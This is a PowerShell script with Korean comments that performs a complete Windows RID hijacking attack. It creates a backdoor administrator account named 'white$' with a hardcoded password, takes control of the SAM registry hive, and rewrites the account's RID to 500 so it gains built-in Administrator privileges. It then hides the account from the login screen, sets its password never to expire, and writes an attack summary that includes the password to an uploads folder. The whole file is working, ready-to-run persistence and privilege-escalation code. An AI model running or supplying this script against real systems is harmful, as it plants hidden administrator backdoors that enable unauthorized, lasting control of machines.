# Complete RID Hijacking - Simplified
# Requires SYSTEM privileges

$result = @()
$result += "===== RID Hijacking Attack ====="
$result += "Timestamp: " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
$result += ""

# 설정
$username = "white$"
$password = "Passw0rd!"
$targetRID = 500

try {
    # 1. 백도어 계정 생성
    $result += "[*] Creating backdoor account..."
    net user $username $password /add 2>&1 | Out-Null
    net localgroup Administrators $username /add 2>&1 | Out-Null
    $result += "[+] Account created: " + $username
    
    # 2. 현재 RID 확인
    $user = New-Object System.Security.Principal.NTAccount($username)
    $sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
    $sidString = $sid.Value
    
    # SID에서 RID 추출 (마지막 숫자)
    $lastDash = $sidString.LastIndexOf("-")
    $ridString = $sidString.Substring($lastDash + 1)
    $currentRID = [int]$ridString
    
    $result += "[*] Current SID: " + $sidString
    $result += "[*] Current RID: " + $currentRID
    $result += ""
    
    # 3. SAM 레지스트리 접근
    $result += "[*] Enabling SAM registry access..."
    
    $acl = Get-Acl "HKLM:\SAM\SAM"
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule($currentUser, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl "HKLM:\SAM\SAM" $acl
    $result += "[+] SAM access granted"
    
    # 4. RID 16진수 변환
    $hexFormat = "X8"
    $currentRIDHex = $currentRID.ToString($hexFormat)
    $targetRIDHex = $targetRID.ToString($hexFormat)
    
    $result += "[*] Current RID (hex): 0x" + $currentRIDHex
    $result += "[*] Target RID (hex): 0x" + $targetRIDHex + " (Administrator)"
    $result += ""
    
    # 5. 레지스트리 경로
    $currentRegPath = "HKLM:\SAM\SAM\Domains\Account\Users\" + $currentRIDHex
    
    $result += "[*] Registry key: " + $currentRIDHex
    $result += ""
    
    # 6. F 값 읽기 및 수정
    $result += "[*] Reading F value from registry..."
    
    $fValue = Get-ItemProperty -Path $currentRegPath -Name "F"
    $fBytes = $fValue.F
    
    $result += "[+] F value retrieved (" + $fBytes.Length + " bytes)"
    
    # RID 오프셋 0x30
    $ridOffset = 48
    $storedRID = [BitConverter]::ToUInt32($fBytes, $ridOffset)
    $result += "[*] Stored RID at offset 0x30: " + $storedRID
    
    # RID 수정
    $result += "[*] Modifying RID to " + $targetRID + "..."
    $newRIDBytes = [BitConverter]::GetBytes([UInt32]$targetRID)
    
    $fBytes[48] = $newRIDBytes[0]
    $fBytes[49] = $newRIDBytes[1]
    $fBytes[50] = $newRIDBytes[2]
    $fBytes[51] = $newRIDBytes[3]
    
    Set-ItemProperty -Path $currentRegPath -Name "F" -Value $fBytes -Type Binary
    $result += "[+] F value modified successfully"
    
    # 검증
    $verifyFValue = Get-ItemProperty -Path $currentRegPath -Name "F"
    $verifyRID = [BitConverter]::ToUInt32($verifyFValue.F, $ridOffset)
    $result += "[+] Verification: RID is now " + $verifyRID
    
    $result += ""
    
    # 7. LSA 캐시 갱신
    $result += "===== LSA CACHE REFRESH ====="
    
    net user $username /active:no 2>&1 | Out-Null
    Start-Sleep -Milliseconds 500
    net user $username /active:yes 2>&1 | Out-Null
    $result += "[+] Account toggled"
    
    net user $username $password 2>&1 | Out-Null
    $result += "[+] Password reset"
    
    net localgroup Administrators $username /delete 2>&1 | Out-Null
    net localgroup Administrators $username /add 2>&1 | Out-Null
    $result += "[+] Group refreshed"
    
    $result += ""
    
    # 8. 은폐
    $result += "===== STEALTH ====="
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v $username /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    $result += "[+] Hidden from login screen"
    
    wmic useraccount where "name='$username'" set PasswordExpires=False 2>&1 | Out-Null
    $result += "[+] Password never expires"
    
    net user $username /comment:"" 2>&1 | Out-Null
    $result += "[+] Comment cleared"
    
    $result += ""
    
    # 9. 검증
    $result += "===== VERIFICATION ====="
    
    Start-Sleep -Seconds 2
    
    $verifyFValue2 = Get-ItemProperty -Path $currentRegPath -Name "F"
    $registryRID = [BitConverter]::ToUInt32($verifyFValue2.F, $ridOffset)
    $result += "[*] Registry RID: " + $registryRID
    
    $finalUser = New-Object System.Security.Principal.NTAccount($username)
    $finalSid = $finalUser.Translate([System.Security.Principal.SecurityIdentifier])
    $finalSidString = $finalSid.Value
    $lastDash2 = $finalSidString.LastIndexOf("-")
    $tokenRIDString = $finalSidString.Substring($lastDash2 + 1)
    $tokenRID = [int]$tokenRIDString
    
    $result += "[*] Token RID (cached): " + $tokenRID
    $result += "[*] Final SID: " + $finalSidString
    
    if ($registryRID -eq $targetRID) {
        $result += "[+] Registry modification: SUCCESS"
    }
    
    if ($tokenRID -eq $targetRID) {
        $result += "[+] RID HIJACKING FULLY SUCCESSFUL!"
    } else {
        $result += "[!] Registry RID: " + $registryRID + " (modified)"
        $result += "[!] Token RID: " + $tokenRID + " (cached)"
        $result += "[!] Full effect on next login or reboot"
    }
    
    $result += ""
    
    # 10. 요약
    $result += "===== ATTACK SUMMARY ====="
    $result += "[+] Backdoor account: " + $username
    $result += "[+] Password: " + $password
    $result += "[+] Target RID: " + $targetRID + " (Administrator)"
    $result += "[+] Registry RID: " + $registryRID
    $result += "[+] Account hidden: YES"
    $result += "[+] Password expires: NO"
    
    $result += ""
    $result += "===== Attack Complete ====="
    
} catch {
    $result += "[-] Error: " + $_.Exception.Message
    $result += "[-] Line: " + $_.InvocationInfo.ScriptLineNumber
}

$result | Out-File C:\CentralManagement\uploads\rid_complete.txt -Encoding ASCII
$result | ForEach-Object { Write-Host $_ }